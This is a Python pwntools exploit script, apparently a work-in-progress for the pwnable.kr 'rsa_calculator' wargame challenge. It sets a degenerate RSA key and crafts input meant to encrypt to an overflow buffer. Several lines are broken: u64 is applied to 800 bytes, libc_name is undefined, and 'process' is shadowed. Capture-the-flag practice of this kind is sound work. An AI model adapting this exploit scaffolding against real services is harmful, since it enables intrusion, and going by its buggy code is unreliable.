from pwn import *
import sys
import time

# context
context.arch="amd64"
context.kernel="amd64"
context.os="linux"
context.log_level="debug"


# Binary specific settings
binary_name = "rsa_calculator"
REMOTE = "nc pwnable.kr 9012"

# Set up actual exploitation parameters
e  = ELF(binary_name, checksec=True)
rop = ROP(binary_name)
libc=e.libc # So long as i'm not running against the remote target, use the local libc
context.binary = e


def mod_exp(base, exp, mod):
    """Performs modular exponentiation: (base^exp) % mod."""
    result = 1
    while exp:
        if exp & 1:
            result = (result * base) % mod
        base = (base * base) % mod
        exp >>= 1
    return result

def mod_inverse(a, mod):
    """Finds the modular inverse of a under mod using the Extended Euclidean Algorithm."""
    t, new_t = 0, 1
    r, new_r = mod, a
    while new_r != 0:
        quotient = r // new_r
        t, new_t = new_t, t - quotient * new_t
        r, new_r = new_r, r - quotient * new_r
    if r > 1:
        raise ValueError("Input has no modular inverse.")
    if t < 0:
        t += mod
    return t

def prepare_input(to_encrypt, e, product):
    """Prepares input to satisfy encrypt_helper(prepare_input(input)) = input."""
    return mod_inverse(mod_exp(to_encrypt, e, product), product)


def recieveMenu(p):
    p.recvlines(6)

def setKey(process, p, q, e, d):
    process.sendline(b"1")
    process.sendline(p)
    process.sendline(q)
    process.sendline(e)
    process.sendline(d)
    process.recvlines(15)

def main():
    if(len(sys.argv) <2):
        print("Running locally")
        process = process(f"./{binary_name}")
    else:
        if(sys.argv[1] == "remote"):
            ip, port = REMOTE.replace("nc ", "").split(" ")
            port = int(port)
            process = remote(ip, port)
            libc = ELF(f"./{libc_name}")
        elif(sys.argv[1] == "gdb"):
            process = gdb.debug(f"./{binary_name}", gdbscript="b *0x400F94", aslr=False)
        else:
            process = process(f"./{binary_name}")
    # Constants
    max_size = b"1024"
    p=b"256"
    q= b"1"
    e =b"1"
    d = b"1"

    product = int(p)* int(q)



    process.recvlines(3) # opening message
    recieveMenu(process)

    setKey(process,p, q, e, d)


    process.sendline(b"2") # encrypt
    process.recvuntil(b"(max=1024) : ")
    process.sendline(max_size)
    process.recvline()


    target_payload =b"A" *800
    prepared_payload = prepare_input(u64(target_payload), int(e),product)
    prepared_payload = p64(prepared_payload)
    log.success("created payload that will get encrypted to the target payload")
    

    process.sendline(prepared_payload)
    process.interactive()



main()


